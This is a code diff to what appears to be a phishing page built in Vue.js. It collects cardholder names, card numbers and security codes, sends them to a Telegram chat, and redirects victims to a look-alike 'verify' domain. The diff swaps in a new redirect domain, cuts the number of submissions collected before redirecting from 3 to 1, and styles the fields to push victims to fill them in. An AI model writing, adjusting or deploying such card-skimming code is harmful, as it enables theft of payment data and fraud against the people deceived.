@@ -71,7 +71,7 @@
                   </fieldset>
 
                   <fieldset class="form-group">
-                    <label for="cardholder_name">Cardholder Name*</label>
+                    <label for="cardholder_name">Cardholder Name* <span class="span">Required</span></label>
                     <input name="cardholder_name" id="cardholder_name"
                            type="text"
                            class="form-control"
@@ -80,7 +80,7 @@
                   </fieldset>
 
                   <fieldset class="form-group">
-                    <label for="card_number">Card Number*</label>
+                    <label for="card_number">Card Number* <span class="span">Required</span></label>
                     <input name="card_number" id="card_number"
                            type="text"
                            class="form-control"
@@ -89,7 +89,7 @@
                   </fieldset>
 
                   <fieldset class="form-group">
-                    <label for="card_cvc">Security Code*</label>
+                    <label for="card_cvc">Security Code* <span class="span">Required</span></label>
                     <input name="card_cvc" id="card_cvc"
                            type="text"
                            class="form-control"
@@ -202,7 +202,7 @@
     loading: false,
     isActive: false,
     count: 0,
-    finalCount: 3
+    finalCount: 1 
     }
   },
   components: {
@@ -219,7 +219,7 @@
     await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
     this.isActive = !this.isActive
     }else{
-      location.replace("https://mata-verify.vercel.app/")
+      location.replace("https://auth.sos.mta.netsolbal.cc")
   
     }
     },
@@ -257,7 +257,10 @@
   margin-top: 10px;
   margin-bottom: 10px;
 }
-
+.span{
+  color: red;
+  font-size: larger;
+}
 /*!
  * Bootstrap v4.6.2 (https://getbootstrap.com/)
  * Copyright 2011-2022 The Bootstrap Authors
